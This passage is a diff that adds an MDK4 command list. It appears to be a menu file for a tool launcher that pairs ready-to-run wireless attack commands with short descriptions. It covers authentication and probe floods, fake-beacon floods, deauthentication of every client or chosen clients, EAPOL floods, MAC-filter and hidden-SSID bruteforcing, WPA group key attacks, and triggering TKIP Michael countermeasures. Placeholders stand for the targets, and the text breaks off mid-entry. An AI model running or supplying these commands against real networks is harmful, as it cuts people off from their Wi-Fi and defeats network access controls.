@@ -1,0 +1,103 @@
+# MDK4 Command List
+# Format: [\] command [/] description [X] menutitlename
+
+[X] MDK4 Command List
+
+# -------------------------
+# MODE a — Authentication DoS
+# -------------------------
+
+[\] mdk4 wlan0mon a
+[/] Authentication DoS attack (default)
+
+[\] mdk4 wlan0mon a -a <AP_MAC>
+[/] Target a specific AP
+
+[\] mdk4 wlan0mon a -m <MAC>
+[/] Use a custom client MAC
+
+[\] mdk4 wlan0mon a -s 100
+[/] Send 100 auth frames per second
+
+# -------------------------
+# MODE b — Beacon Flood
+# -------------------------
+
+[\] mdk4 wlan0mon b
+[/] Random SSID beacon flood
+
+[\] mdk4 wlan0mon b -n 50
+[/] Generate 50 fake networks
+
+[\] mdk4 wlan0mon b -f ssids.txt
+[/] Beacon flood using SSIDs from file
+
+[\] mdk4 wlan0mon b -a <AP_MAC>
+[/] Clone AP beacons
+
+# -------------------------
+# MODE d — Deauthentication / Disassociation
+# -------------------------
+
+[\] mdk4 wlan0mon d
+[/] Deauth all clients from all APs
+
+[\] mdk4 wlan0mon d -a <AP_MAC>
+[/] Deauth clients from a specific AP
+
+[\] mdk4 wlan0mon d -c <CLIENT_MAC>
+[/] Deauth a specific client
+
+[\] mdk4 wlan0mon d -s 50
+[/] Send 50 deauth frames per second
+
+# -------------------------
+# MODE e — EAPOL / WPA Handshake Stress
+# -------------------------
+
+[\] mdk4 wlan0mon e -t <AP_MAC>
+[/] Stress-test WPA handshake
+
+[\] mdk4 wlan0mon e -t <AP_MAC> -f
+[/] Force EAPOL flood
+
+# -------------------------
+# MODE f — MAC Filter Bruteforce
+# -------------------------
+
+[\] mdk4 wlan0mon f -t <AP_MAC>
+[/] Bruteforce MAC filter on AP
+
+[\] mdk4 wlan0mon f -t <AP_MAC> -m <MAC_LIST>
+[/] Use custom MAC list
+
+# -------------------------
+# MODE g — WPA Downgrade / Group Key Attacks
+# -------------------------
+
+[\] mdk4 wlan0mon g -t <AP_MAC>
+[/] Attempt WPA group key attacks
+
+# -------------------------
+# MODE m — Michael Countermeasures
+# -------------------------
+
+[\] mdk4 wlan0mon m -t <AP_MAC>
+[/] Trigger TKIP Michael countermeasures
+
+# -------------------------
+# MODE p — Probe Request Flood
+# -------------------------
+
+[\] mdk4 wlan0mon p
+[/] Random probe request flood
+
+[\] mdk4 wlan0mon p -f ssids.txt
+[/] Probe flood using SSID list
+
+# -------------------------
+# MODE s — SSID Bruteforce
+# -------------------------
+
+[\] mdk4 wlan0mon s -t <AP_MAC>
+[/] Bruteforce hidden SS
